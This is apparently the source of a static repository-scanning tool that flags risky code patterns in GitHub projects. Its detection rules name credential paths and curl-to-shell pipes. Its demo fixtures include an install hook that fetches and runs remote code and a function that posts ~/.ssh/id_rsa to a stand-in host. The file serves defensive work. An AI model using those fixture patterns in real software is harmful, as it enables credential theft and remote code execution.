"""Static, bounded analysis. This module never executes repository content."""
from __future__ import annotations
import ast, base64, hashlib, io, json, math, re, tarfile, urllib.parse, urllib.request
from collections import Counter
from datetime import datetime, timezone
from pathlib import PurePosixPath

MAX_OBJECTS = 12000
MAX_TOTAL = 80 * 1024 * 1024
MAX_FILE = 1024 * 1024
VERSION = '0.1.0'
LANGUAGES = {'.py':'Python','.js':'JavaScript','.jsx':'JavaScript','.ts':'TypeScript','.tsx':'TypeScript','.sh':'Shell','.ps1':'PowerShell','.go':'Go','.rs':'Rust','.java':'Java','.c':'C','.h':'C','.cpp':'C++','.cs':'C#','.rb':'Ruby','.json':'JSON','.yaml':'YAML','.yml':'YAML','.toml':'TOML','.md':'Markdown'}
SECRET = re.compile(r'(?i)((?:api[_-]?key|secret|password|token)\s*[:=]\s*[\"\'])([^\"\'\n]{8,})([\"\'])')
TOKEN = re.compile(r'\b(?:AKIA[A-Z0-9]{16}|gh[pousr]_[A-Za-z0-9_]{20,}|sk-[A-Za-z0-9_-]{20,})\b')
def redact(s):
    s=re.sub(r'-----BEGIN ([A-Z ]*PRIVATE KEY)-----[\s\S]*?-----END \1-----','[REDACTED PRIVATE KEY]',s)
    s=re.sub(r'(https?://)[^/@\s:]+:[^/@\s]+@',r'\1[REDACTED]@',s)
    return TOKEN.sub('[REDACTED]', SECRET.sub(lambda m:m[1]+'[REDACTED]'+m[3], s))
def sha(data): return hashlib.sha256(data).hexdigest()
def now(): return datetime.now(timezone.utc).isoformat()

RULES = [
 ('RS-EXEC-001','Dynamic code execution','high','medium','behavior',r'\b(?:eval|exec)\s*\(', 'Dynamic evaluation can turn a string into executable code. Check where its input comes from.'),
 ('RS-PROC-001','Process execution','medium','high','behavior',r'\b(?:subprocess\.(?:run|Popen|call|check_output)|os\.system|child_process|execSync|spawnSync|Runtime\.getRuntime)\b','A process execution API is referenced. Review the command and whether untrusted input reaches it.'),
 ('RS-NET-001','Outbound network request','low','medium','behavior',r'\b(?:requests\.(?:get|post|put)|fetch\s*\(|https?\.(?:get|request)|urllib\.request|Invoke-WebRequest|curl\s|wget\s)','Network intent is visible in source; no connection was made by this analysis.'),
 ('RS-CRED-001','Sensitive credential path','high','medium','behavior',r'(?:\.ssh[/\\]|\.aws[/\\]|Login Data|keychain|\.config[/\\]gcloud|id_rsa|\.npmrc)','Code references a credential location. Establish the intended purpose and destination before running it.'),
 ('RS-SHELL-001','Remote content piped to a shell','high','high','behavior',r'(?:curl|wget)[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|powershell)','A remote download is piped into a command interpreter.'),
 ('RS-PERSIST-001','Persistence-related configuration','medium','medium','behavior',r'(?:CurrentVersion\\Run|crontab|LaunchAgents|systemctl\s+enable|schtasks\s+/create)','Source references an automatic startup mechanism. Review whether this is an expected installation step.'),
 ('RS-CI-001','Privileged workflow trigger','high','medium','supply_chain',r'\bpull_request_target\b','This trigger can give workflows elevated access. Check checkout and untrusted input handling.'),
 ('RS-CI-002','Unpinned GitHub Action','medium','high','supply_chain',r'uses:\s*[^\s./][^\s]*@(?![a-fA-F0-9]{40}\b)[^\s]+','The action uses a moving reference instead of an immutable commit.'),
 ('RS-TLS-001','TLS verification disabled','medium','high','vulnerability',r'(?:verify\s*=\s*False|rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*[\"\']?0)','Disabling certificate verification can expose connections to interception.'),
 ('RS-SHELL-002','Shell interpreter enabled','medium','high','vulnerability',r'\bshell\s*=\s*True','Shell parsing is enabled. Review command construction for injection.'),
]

def validate_url(url):
    p = urllib.parse.urlparse(url)
    parts = p.path.strip('/').split('/')
    if p.scheme != 'https' or p.netloc != 'github.com' or p.query or p.fragment or len(parts)!=2 or not all(re.fullmatch(r'[\w.-]+', x) and x not in ('.','..') for x in parts):
        raise ValueError('Use a public repository URL: https://github.com/owner/repository')
    return parts[0], parts[1].removesuffix('.git')

class RestrictedRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        p=urllib.parse.urlparse(newurl)
        if p.scheme!='https' or p.hostname not in ('api.github.com','codeload.github.com','github.com'):
            raise ValueError('Unexpected download redirect rejected')
        return super().redirect_request(req,fp,code,msg,headers,newurl)

def fetch(url, limit=MAX_TOTAL):
    req=urllib.request.Request(url,headers={'User-Agent':'RepoSentinel/0.1','Accept':'application/vnd.github+json'})
    with urllib.request.build_opener(RestrictedRedirect()).open(req,timeout=35) as r:
        data=r.read(limit+1)
    if len(data)>limit: raise ValueError('Download exceeds the 80 MB limit')
    return data

def github_snapshot(url, ref, progress):
    owner,name=validate_url(url)
    progress('RESOLVING_COMMIT','Resolving the requested reference to an immutable commit')
    repo=json.loads(fetch(f'https://api.github.com/repos/{owner}/{name}',2*1024*1024))
    ref=ref or repo['default_branch']
    commit=json.loads(fetch(f'https://api.github.com/repos/{owner}/{name}/commits/{urllib.parse.quote(ref,safe="")}',8*1024*1024))
    commit_sha=commit['sha']
    if not re.fullmatch('[0-9a-f]{40}',commit_sha): raise ValueError('GitHub returned an invalid commit')
    progress('DOWNLOADING','Reading the immutable source archive; no clone hooks or builds')
    data=fetch(f'https://codeload.github.com/{owner}/{name}/tar.gz/{commit_sha}')
    objects=read_archive(data)
    progress('INVENTORY','Checking Git tree object accounting')
    tree=json.loads(fetch(f'https://api.github.com/repos/{owner}/{name}/git/trees/{commit["commit"]["tree"]["sha"]}?recursive=1',20*1024*1024))
    if tree.get('truncated'): raise ValueError('GitHub tree inventory was truncated. Refusing incomplete accounting.')
    known={x['path'] for x in objects}
    for x in tree['tree']:
        if x['type']=='commit':
            objects.append({'path':x['path'],'kind':'submodule','data':b'','target':x['sha']})
        elif x['path'] not in known:
            objects.append({'path':x['path'],'kind':'unresolved','data':b'','target':x['sha']})
    if len(objects)>MAX_OBJECTS: raise ValueError('Repository exceeds 12,000 objects')
    return objects, {'name':f'{owner}/{name}','url':url,'requested_ref':ref,'commit':commit_sha,'provenance':'github_commit'}

def read_archive(data):
    objects=[]; total=0; seen=set()
    with tarfile.open(fileobj=io.BytesIO(data),mode='r:gz') as tf:
        root=None
        for m in tf:
            raw=PurePosixPath(m.name)
            if raw.is_absolute() or '..' in raw.parts: raise ValueError('Unsafe archive path rejected')
            if not raw.parts: continue
            root=root or raw.parts[0]
            if raw.parts[0]!=root: raise ValueError('Archive must contain one repository root')
            path='/'.join(raw.parts[1:])
            if not path: continue
            if path in seen: raise ValueError('Duplicate archive path rejected')
            seen.add(path)
            if len(objects)>=MAX_OBJECTS: raise ValueError('Repository exceeds 12,000 objects')
            total+=m.size
            if total>MAX_TOTAL or total/max(len(data),1)>250: raise ValueError('Archive expansion limit exceeded')
            kind='directory' if m.isdir() else 'symlink' if m.issym() or m.islnk() else 'file' if m.isfile() else 'unsupported'
            body=b''
            if kind=='file' and m.size<=MAX_FILE:
                f=tf.extractfile(m)
                if f: body=f.read(MAX_FILE+1)
            objects.append({'path':path,'kind':kind,'data':body,'size':m.size,'mode':m.mode,'target':m.linkname})
    return objects

def classify(path, data):
    name=PurePosixPath(path).name; ext=PurePosixPath(path).suffix.lower()
    if data.startswith(b'version https://git-lfs.github.com/spec/v1'): return 'LFS_POINTER'
    if any(x in path.split('/') for x in ('vendor','node_modules','third_party')): return 'VENDORED'
    if ext in ('.zip','.gz','.tar','.tgz','.7z','.rar','.jar','.apk'): return 'ARCHIVE'
    if b'\x00' in data or ext in ('.exe','.dll','.so','.wasm','.bin','.pyc'): return 'BINARY'
    if path.startswith('.github/workflows/'): return 'CI_CONFIG'
    if name in ('package.json','pyproject.toml','requirements.txt','Cargo.toml','go.mod'): return 'PACKAGE_MANIFEST'
    if 'lock' in name: return 'LOCKFILE'
    if ext in ('.md','.rst','.txt') or name.upper() in ('README','LICENSE','COPYING','CHANGELOG','CONTRIBUTING','SECURITY','NOTICE'): return 'DOCUMENTATION'
    if ext in ('.sh','.ps1','.bat','.cmd') or name in ('Dockerfile','Makefile','setup.py','build.rs'): return 'BUILD_SOURCE'
    if '.min.' in name: return 'MINIFIED'
    if ext in ('.json','.yaml','.yml','.toml','.ini','.conf') or name.startswith('.env'): return 'CONFIG'
    if ext in LANGUAGES: return 'TEST_SOURCE' if re.search(r'(^|/)(test[s]?|__tests__)(/|_)',path) else 'FIRST_PARTY_SOURCE'
    return 'UNKNOWN'

def finding(path,line,rule,title,severity,confidence,category,message,snippet):
    fingerprint=sha(f'{path}:{line}:{rule}'.encode())
    return dict(id=fingerprint[:16],fingerprint=fingerprint,path=path,start_line=line,end_line=line,rule_id=rule,title=redact(title),severity=severity,confidence=confidence,category=category,message=redact(message),evidence=redact(snippet)[:700],engine='RepoSentinel',engine_version=VERSION,related_files=[],review=None)

def scan_text(path,text,derived=False):
    findings=[]
    for n,line in enumerate(text.splitlines(),1):
        for rule,title,sev,conf,cat,pattern,msg in RULES:
            if re.search(pattern,line,re.I): findings.append(finding(path,n,rule,title,sev,conf,cat,msg,line))
        if SECRET.search(line) or TOKEN.search(line) or 'PRIVATE KEY-----' in line: findings.append(finding(path,n,'RS-SECRET-001','Possible hardcoded credential','high','medium','vulnerability','A credential-shaped value is present. It is redacted in reports. Check whether it is a fixture and rotate it if live.',line))
    return findings

def decode_layers(path,text):
    steps=[]
    patterns=[('Base64',r'(?:atob|b64decode)\s*\(\s*[\"\']([A-Za-z0-9+/=]{8,})[\"\']'),('PowerShell UTF-16LE',r'-(?:EncodedCommand|enc)\s+([A-Za-z0-9+/=]{8,})'),('Hex',r'fromhex\s*\(\s*[\"\']([0-9a-fA-F]{8,})[\"\']')]
    queue=[(text,0,None,None)]
    while queue and len(steps)<60:
        current,depth,origin_line,parent=queue.pop(0)
        if depth>=3: continue
        for label,pattern in patterns:
            for match in list(re.finditer(pattern,current,re.I))[:20]:
                if len(steps)>=60: break
                try:
                    raw=bytes.fromhex(match[1]) if label=='Hex' else base64.b64decode(match[1],validate=True)
                    if len(raw)>65536: continue
                    decoded=raw.decode('utf-16le' if label.startswith('PowerShell') else 'utf-8')
                    if not decoded.strip(): continue
                    anchor=origin_line or current[:match.start()].count('\n')+1
                    step_id=f'derived-{len(steps)}-{sha(path.encode())[:6]}'
                    steps.append({'id':step_id,'path':path,'line':anchor,'layer':depth+1,'transform':label,'original':redact(match[0]),'recovered':redact(decoded),'sha256':sha(raw),'provenance':'DERIVED_DEOBFUSCATED_SOURCE','parent_derivation':parent,'findings':scan_text(path,decoded)})
                    if len(queue)<60: queue.append((decoded,depth+1,anchor,step_id))
                except (ValueError,UnicodeError): pass
    return steps

def parse_source(path,text,language):
    imports=[]; symbols=[]; parser_name=None; errors=False
    if language=='Python':
        parser_name='Python AST'
        try:
            tree=ast.parse(text)
            for node in ast.walk(tree):
                if isinstance(node,(ast.FunctionDef,ast.AsyncFunctionDef,ast.ClassDef)): symbols.append({'name':node.name,'line':node.lineno})
                if isinstance(node,ast.Import): imports.extend(a.name for a in node.names)
                if isinstance(node,ast.ImportFrom) and node.module: imports.append(node.module)
            parser_name='Python AST'
        except (SyntaxError,ValueError,RecursionError): errors=True
    elif language in ('JavaScript','TypeScript'):
        try:
            from tree_sitter import Language, Parser
            if language=='JavaScript':
                import tree_sitter_javascript as grammar
                lang=grammar.language()
            else:
                import tree_sitter_typescript as grammar
                lang=grammar.language_tsx() if path.endswith('.tsx') else grammar.language_typescript()
            tree=Parser(Language(lang)).parse(text.encode())
            errors=tree.root_node.has_error; parser_name='Tree-sitter'
            todo=[tree.root_node]
            while todo:
                node=todo.pop(); todo.extend(node.children)
                if node.type in ('function_declaration','class_declaration','method_definition'):
                    name=node.child_by_field_name('name')
                    if name: symbols.append({'name':name.text.decode(),'line':node.start_point.row+1})
            imports=re.findall(r'(?:from\s*|require\s*\(|import\s*)[\"\']([^\"\']+)',text)
        except ImportError: pass
    return {'parser':parser_name,'parse_error':errors,'imports':imports,'symbols':symbols}

def dependencies(path,text):
    found=[]
    try:
        if path.endswith('package.json'):
            obj=json.loads(text)
            for scope in ('dependencies','devDependencies','optionalDependencies'):
                for name,version in obj.get(scope,{}).items(): found.append({'name':name,'version':redact(str(version)),'ecosystem':'npm','scope':scope,'path':path,'resolved':False})
        elif path.endswith('package-lock.json'):
            obj=json.loads(text)
            for loc,pkg in obj.get('packages',{}).items():
                if loc and 'version' in pkg: found.append({'name':pkg.get('name') or loc.split('node_modules/')[-1],'version':redact(str(pkg['version'])),'ecosystem':'npm','scope':'lockfile','path':path,'resolved':True})
        elif path.endswith('requirements.txt'):
            for line in text.splitlines():
                m=re.match(r'^\s*([\w.-]+)(?:==([^;\s]+))?',line)
                if m: found.append({'name':m[1],'version':m[2] or 'unresolved','ecosystem':'PyPI','scope':'runtime','path':path,'resolved':bool(m[2])})
    except (ValueError,AttributeError,TypeError): pass
    return found

def analyze(objects,meta,progress=lambda *_:None):
    files=[]; findings=[]; derived=[]; deps=[]; graph={'nodes':[],'edges':[]}; texts={}
    progress('STATIC_SCANNING','Inspecting objects and extracting static evidence')
    for obj in objects:
        path=obj['path']; data=obj['data']; kind=obj.get('kind','file'); size=obj.get('size',len(data)); classification=classify(path,data)
        item={'id':sha(path.encode())[:16],'path':path,'kind':kind,'size':size,'sha256':sha(data) if kind=='file' and size<=MAX_FILE else None,'language':LANGUAGES.get(PurePosixPath(path).suffix,'Other'),'classification':classification,'status':'STATICALLY_INSPECTED','source':None,'parser':None,'imports':[],'symbols':[],'parse_error':False,'executable':bool(obj.get('mode',0)&0o111)}
        if kind=='directory': item['status']='INVENTORIED'
        elif kind=='symlink': item.update(status='UNRESOLVED',detail=f'Symlink not followed: {obj.get("target","")}')
        elif kind=='submodule': item.update(status='EXTERNAL_SUBMODULE',detail=f'Not fetched; pinned object {obj.get("target","")}')
        elif kind!='file': item.update(status='UNRESOLVED',detail='Object content is unavailable for static analysis')
        elif size>MAX_FILE: item.update(status='UNRESOLVED',detail='File exceeds 1 MB inspection limit; content was not read')
        elif classification=='LFS_POINTER': item.update(status='LFS_POINTER',source=data.decode(errors='replace'),detail='Pointer accounted for; LFS content was not fetched')
        elif classification=='ARCHIVE': item.update(status='UNRESOLVED',detail='Nested archive hashed; extraction is not enabled')
        elif classification=='BINARY':
            counts=Counter(data); entropy=-sum((v/len(data))*math.log2(v/len(data)) for v in counts.values()) if data else 0
            strings=[redact(s.decode(errors='replace')) for s in re.findall(rb'[\x20-\x7e]{8,}',data)[:30]]
            binary={'magic':data[:16].hex(),'entropy':round(entropy,3),'strings':strings}
            try:
                import lief
                lief.logging.disable()
                parsed=lief.parse(list(data))
                if parsed:
                    binary.update(format=type(parsed).__module__,sections=[{'name':s.name,'size':s.size} for s in parsed.sections][:50])
                    if hasattr(parsed,'imported_functions'): binary['imports']=[f.name for f in parsed.imported_functions][:100]
            except (ImportError,ValueError,RuntimeError,AttributeError): pass
            item.update(status='BINARY_INSPECTED',binary=binary,detail='Header, hash, entropy, strings and available LIEF metadata inspected; capabilities unresolved')
        else:
            try: text=data.decode('utf-8')
            except UnicodeDecodeError:
                item.update(status='UNSUPPORTED',detail='Non-UTF-8 text is not parsed'); files.append(item); continue
            item['source']=redact(text); texts[path]=text
            if classification not in ('DOCUMENTATION','UNKNOWN'):
                findings.extend(scan_text(path,text))
            item.update(parse_source(path,text,item['language']))
            if item['parser']: item['status']='UNRESOLVED' if item['parse_error'] else 'AST_PARSED'
            if classification=='UNKNOWN': item.update(status='UNSUPPORTED',detail='Unknown file format; inventoried and hashed')
            ds=decode_layers(path,text); derived.extend(ds)
            for d in ds:
                for f in d['findings']:
                    f['derived_id']=d['id']; f['derived_line']=f['start_line']; f['start_line']=d['line']; f['end_line']=d['line']; f['message']='Recovered content: '+f['message']; f['id']=sha((f['id']+d['id']).encode())[:16]; findings.append(f)
            deps.extend(dependencies(path,text))
            if path.endswith('package.json'):
                try:
                    for hook,cmd in json.loads(text).get('scripts',{}).items():
                        if hook in ('preinstall','install','postinstall','prepare'):
                            ln=next((i for i,l in enumerate(text.splitlines(),1) if f'"{hook}"' in l),1)
                            findings.append(finding(path,ln,'RS-HOOK-001','Package lifecycle hook','high' if re.search('curl|wget|https?://',cmd) else 'medium','high','supply_chain',f'The {hook} hook runs during package lifecycle operations. Review it before installation.',cmd))
                except (ValueError,AttributeError,TypeError): pass
        files.append(item)
    progress('GRAPH_BUILDING','Linking source references and evidence across files')
    for file in files:
        graph['nodes'].append({'id':file['path'],'label':PurePosixPath(file['path']).name,'path':file['path'],'kind':'file'})
        for imp in file['imports']:
            base=PurePosixPath(file['path']).parent
            candidates=[str(base/(imp.replace('.','/')+'.py')),imp.replace('.','/')+'.py',str(base/imp.replace('.','/')/'__init__.py')] if file['language']=='Python' else [str(base/imp)+ext for ext in ('','.js','.ts','.tsx','/index.js','/index.ts')]
            for dest in candidates:
                # Normalize only a logical reference, never open paths from source.
                parts=[]
                for part in dest.split('/'):
                    if part=='..':
                        if parts: parts.pop()
                    elif part!='.': parts.append(part)
                dest='/'.join(parts)
                if dest in texts: graph['edges'].append({'source':file['path'],'target':dest,'kind':'imports','confidence':'high'}); break
    for path,text in texts.items():
        if path.endswith('package.json'):
            try:
                for hook,cmd in json.loads(text).get('scripts',{}).items():
                    if hook in ('preinstall','install','postinstall','prepare'):
                        for target in re.findall(r'(?:node|python3?|sh|bash)\s+(?:\./)?([\w./-]+)',cmd):
                            target=str(PurePosixPath(path).parent/target)
                            if target in texts: graph['edges'].append({'source':path,'target':target,'kind':f'{hook} references','confidence':'high'})
            except (ValueError,AttributeError,TypeError): pass
    for edge in graph['edges']:
        source_f=[f for f in findings if f['path']==edge['source']]
        target_f=[f for f in findings if f['path']==edge['target']]
        for f in source_f:
            if target_f: f['related_files']=sorted(set(f['related_files']+[edge['target']]))
        if any(f['rule_id']=='RS-HOOK-001' for f in source_f) and any(f['rule_id'] in ('RS-NET-001','RS-SHELL-001','RS-EXEC-001') for f in target_f):
            f=finding(edge['source'],source_f[0]['start_line'],'RS-CHAIN-001','Install hook reaches network or execution code','high','medium','behavior','A lifecycle command references a file containing network or execution indicators. This is a static relationship, not proven runtime data flow.',source_f[0]['evidence']); f['related_files']=[edge['target']]; findings.append(f)
    findings.sort(key=lambda f:({'critical':0,'high':1,'medium':2,'low':3,'info':4}.get(f['severity'],4),f['path'],f['start_line']))
    for f in files: f['finding_count']=sum(x['path']==f['path'] for x in findings)
    progress('REPORTING','Calculating coverage and preserving uncertainty')
    unresolved=[f for f in files if f['status'] in ('UNRESOLVED','UNSUPPORTED','LFS_POINTER','EXTERNAL_SUBMODULE') or f['classification']=='BINARY']
    content=[f for f in files if f['kind']!='directory']
    inspected=[f for f in content if f not in unresolved]
    coverage={'discovered':len(files),'accounted':len(files),'silently_skipped':0,'content_objects':len(content),'inspected':len(inspected),'unresolved':len(unresolved),'percent':round(100*len(inspected)/len(content),1) if content else 0,'statuses':dict(Counter(f['status'] for f in files))}
    risk={cat:next((sev for sev in ('critical','high','medium','low') if any(f['category']==cat and f['severity']==sev for f in findings)),'unknown') for cat in ('behavior','vulnerability','supply_chain','dependency','secret')}
    return {'repository':meta,'created_at':now(),'version':VERSION,'files':files,'findings':findings,'derived':derived,'dependencies':deps,'graph':graph,'coverage':coverage,'risk':risk,'state':'PARTIAL','assessment':'REVIEW RECOMMENDED' if findings else 'INCONCLUSIVE','limitations':['Static analysis cannot establish runtime safety.','Text rules indicate patterns, not proven taint flow.','Binary capability and nested archive analysis are incomplete.','Advisory matches depend on supported manifests, exact versions and database coverage. Absence of matches is not proof of vulnerability absence.','AI assessment is separate from static evidence and cannot certify runtime safety.'],'scanner_runs':[{'engine':'RepoSentinel','status':'COMPLETED','version':VERSION,'detail':'Static patterns, Python AST, source relationships, bounded decoding'},{'engine':'AI review','status':'NOT_REQUESTED','version':None,'detail':'No automatic AI recorded; shared providers are available through AEGIS'}]}

DEMO_FILES={
'package.json': '{\n  "name": "sample-sync-agent",\n  "version": "1.0.0",\n  "scripts": {\n    "postinstall": "node scripts/setup.js"\n  },\n  "dependencies": {"node-fetch": "2.6.1"}\n}\n',
'scripts/setup.js': 'const https = require("https");\nconst { execSync } = require("child_process");\n\n// Synthetic evidence fixture. Never execute.\nhttps.get("https://updates.example.invalid/bootstrap", response => {\n  let payload = "";\n  response.on("data", chunk => { payload += chunk; });\n  response.on("end", () => {\n    execSync(payload);\n  });\n});\n',
'src/credentials.py': 'from pathlib import Path\nimport requests\n\ndef collect():\n    key = Path("~/.ssh/id_rsa").expanduser().read_text()\n    requests.post("https://sync.example.invalid/backup", data={"key": key})\n',
'src/main.py':'from credentials import collect\n\ndef run():\n    collect()\n',
'src/encoded.js':'// Synthetic encoded snippet for review\nconst code = atob("ZXZhbCh1c2VySW5wdXQp");\neval(code);\n',
'.github/workflows/release.yml':'name: release\non: pull_request_target\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n',
'README.md':'# Synthetic scan fixture\nIntentionally suspicious source used to demonstrate RepoSentinel.\nThis is not a real repository and is never executed.\n',
'assets/model.bin':b'\x00\x01SYNTHETIC-BINARY\x00https://example.invalid',
'models/weights.dat':'version https://git-lfs.github.com/spec/v1\noid sha256:'+('0'*64)+'\nsize 2048\n',
'requirements.txt':'requests==2.31.0\n',
}
def demo_objects(): return [{'path':p,'kind':'file','data':d.encode() if isinstance(d,str) else d} for p,d in DEMO_FILES.items()]
